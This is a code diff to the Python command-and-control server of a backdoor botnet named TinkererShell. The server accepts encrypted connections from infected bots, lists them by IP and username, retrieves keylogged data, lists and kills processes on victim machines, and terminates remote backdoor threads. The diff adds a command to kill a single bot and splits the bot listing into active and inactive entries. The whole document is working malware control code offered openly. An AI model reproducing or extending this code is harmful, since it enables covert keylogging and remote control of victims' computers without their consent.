@@ -23,6 +23,7 @@ active_bot = 1000
 thr_exit = threading.Event()
 
 
+# noinspection PyUnboundLocalVariable
 def connection_gate():
     """Thread that keep accepting new bots, assigning ports, and passing them to other threads doing keep-alive.\n"""
     host = ''
@@ -49,6 +50,7 @@ def connection_gate():
                 pass
         if thr_exit.isSet():
             break
+        # noinspection PyUnboundLocalVariable
         lengthcrypt = conn_gate.recv(1024).decode('utf-8')
         expected_length = int(decode_aes(lengthcrypt))
         encrypted_received_data: str = ''
@@ -257,6 +259,7 @@ def keylogshower():
         keylogged_descriptor.close()
     except IOError as exception_keylogshower:
         if exception_keylogshower.errno == 2:
+            # noinspection PyPep8
             logging(
                 data_to_log='It looks like you never downloaded keylogged data from bot!\n Going to download it now for you...\n',
                 printer=True)
@@ -266,25 +269,44 @@ def keylogshower():
             logging(data_to_log=str(exception_keylogshower), printer=True)
 
 
+def kill_current_bot() -> bool:
+    # noinspection PyPep8
+    """Terminate remote backdoor thread.\n"""
+    global connected_sockets
+    double_check = ask_input(phrase='Are you sure? yes/no\n')
+    if double_check == 'yes':
+        sender('SHkill')
+        response = receiver()
+        if response == 'mistochiudendo':
+            pass
+        else:
+            logging(data_to_log=response, printer=True)
+        connected_sockets[active_bot]['status'] = False
+        return True
+    logging(data_to_log='Operation aborted\n', printer=True)
+    return False
+
+
 def quit_utility() -> bool:
     # noinspection PyPep8
-    """Quit and terminate remote backdoor thread. If mailactivation thread is not running the bot gonna kill himself.\n"""
+    """Ask if user wants to terminate backdoor threads in connected bots and kill them, then exits.\n"""
     global conn
     global thr_exit
     double_check = ask_input(phrase='Are you sure? yes/no\n')
     kill_all = ask_input(phrase='Do you want to kill all the bots? yes/no\n')
     if double_check == 'yes':
         for bot in connected_sockets:
-            conn = bot['conn']
-            if kill_all == 'yes':
-                sender('SHkill')
-            else:
-                sender('SHquit')
-            response = receiver()
-            if response == 'mistochiudendo':
-                pass
-            else:
-                logging(data_to_log=response, printer=True)
+            if bot['status'] is True:
+                conn = bot['conn']
+                if kill_all == 'yes':
+                    sender('SHkill')
+                else:
+                    sender('SHquit')
+                response = receiver()
+                if response == 'mistochiudendo':
+                    pass
+                else:
+                    logging(data_to_log=response, printer=True)
         thr_exit.set()
         return True
     logging(data_to_log='Operation aborted\n', printer=True)
@@ -337,10 +359,14 @@ class BotSwitcher(cmd.Cmd):
     # ---------------------------------------------------------------------------------------------
     def do_SHbots(self, option):
         """SHbots\n\tList connected bots.\n"""
-        printable_bots = 'Listing bots...'
+        active_bots = '\nActive bots:'
+        inactive_bots = '\n\nInactive bots:'
         for bots_counter, bot in enumerate(connected_sockets):
             if bot['status'] is True:
-                printable_bots += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
+                active_bots += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
+            else:
+                inactive_bots += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
+        printable_bots = active_bots + inactive_bots
         logging(data_to_log=printable_bots, printer=True)
 
     # ---------------------------------------------------------------------------------------------
@@ -362,10 +388,6 @@ class BotSwitcher(cmd.Cmd):
                     logging(data_to_log='The selected bot does not exist\n', printer=True)
                 else:
                     logging(data_to_log=str(exception_default), printer=True)
-            else:
-                pass
-        else:
-            pass
 
     # ---------------------------------------------------------------------------------------------
     def do_SHquit(self, option) -> bool:
@@ -416,12 +438,14 @@ class CommandExecutorInput(cmd.Cmd):
 
 
 # =================================================================================================
+# noinspection PyMethodMayBeStatic
 class TinkererShellInput(cmd.Cmd):
     """TinkererShell.\n"""
 
     prompt = '\n(SHCmd) '
 
     # ---------------------------------------------------------------------------------------------
+    # noinspection PyMethodMayBeStatic
     def do_SHprocess(self, option):
         """SHprocesses [option]\n\tlist: List active processes\n\tkill: Kill an active process\n"""
         if option:
@@ -512,6 +536,11 @@ class TinkererShellInput(cmd.Cmd):
         """SHreturn\n\tReturn to TinkererShell bot selection mode.\n"""
         logging(data_to_log='Returning to TinkererShell bot selection mode...\n', printer=True)
         return True
+
+    # noinspection PyUnusedLocal
+    def do_SHkill(self, option):
+        """SHkill\n\tKill current bot and return to TinkererShell bot selection mode.\n"""
+        return kill_current_bot()
 
     # ---------------------------------------------------------------------------------------------
     def emptyline(self):
